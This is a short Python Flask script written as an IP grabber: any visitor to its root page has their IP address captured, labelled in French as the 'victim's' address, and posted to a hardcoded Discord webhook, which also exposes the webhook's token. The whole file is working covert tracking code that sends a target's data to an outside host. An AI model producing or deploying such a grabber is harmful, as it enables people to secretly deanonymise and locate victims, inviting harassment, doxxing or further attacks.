from flask import Flask, request
import requests
import json

app = Flask(__name__)

def ipgrab():
    user_ip = request.remote_addr
    return user_ip

@app.route('/')
def webhook():
    user_ip = ipgrab()
    message = f"L'adresse IP de la victime est : {user_ip}"

    webhook_url = "https://discord.com/api/webhooks/1194589877233262662/6U_vTLLwpfgcumnX1m--aWxWuaHpJFzIQ0rrJnT6HHQB4ZQjk1EoQT_unRp6JBIGJqnR"

    payload = {
        "content": message
    }

    headers = {
        "Content-Type": "application/json"
    }

    response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)
    
    return "Message envoyé avec succès !"

if __name__ == '__main__':
    app.run()

